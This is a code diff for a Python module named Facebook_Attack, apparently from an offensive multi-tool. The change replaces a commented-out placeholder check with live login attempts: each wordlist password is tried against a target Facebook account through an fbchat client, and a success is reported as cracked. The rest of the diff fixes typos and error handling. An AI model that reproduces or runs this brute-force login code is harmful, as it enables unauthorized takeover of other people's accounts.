@@ -20,7 +20,7 @@ try:
     import time
     import ssl
     import requests
-    from modules.SMT import *
+    from modules.SMT import fbchat
 
     import_error = False
 
@@ -165,34 +165,39 @@ class Facebook_Attack:
                         words = words.replace("\n", "")
                         self.word = words
                         print("Current Password: " + self.word)
-                        time.sleep(self.delay)
-                        """
-                        if self.word == password:
+                        cracked, c_url = fbchat.Client(self.target_id, self.word)._login()
+                        if cracked == True:
                             print("[i] Password cracked!\tPassword: " + self.word)
+                            print(c_url)
                             API.misc.programFunctions().pause()
+                            break
 
                         else:
                             continue
-                        """
+
+                        time.sleep(self.delay)
 
                     print("[i] Password not cracked... Password not in wordlist.")
                     API.misc.programFunctions().pause()
-                    return 0
+                    break
 
                 except KeyboardInterrupt:
                     print(error.ERROR0002)
                     API.misc.programFunctions().pause()
-                    return 0
+                    break
 
-                except FBchatUserError:
+                except fbchat.client.FBchatUserError:
                     print("[i] Target ID and/or wordlist not set!")
                     API.misc.programFunctions().pause()
-                    return 0
+                    break
 
-                except:
+                except ImportError:
                     print("[i] An unknown error occured... Please contact the author/s for help or create a pull request on GitHub.")
                     API.misc.programFunctions().pause()
-                    return 0
+                    break
+
+                except ValueError as e:
+                    print(e)
 
     def main(self):
         while True:
@@ -238,6 +243,7 @@ class Facebook_Attack:
 
                 elif action == 98:
                     self.execute()
+                    continue
 
                 elif action == 99:
                     return 0
@@ -252,7 +258,7 @@ class Facebook_Attack:
 
             except(ValueError, TypeError):
                 print("[i] Wrong input!")
-                API.misc.programFuncations().pause()
+                API.misc.programFunctions().pause()
 
 def module_body():
     banner = r"""
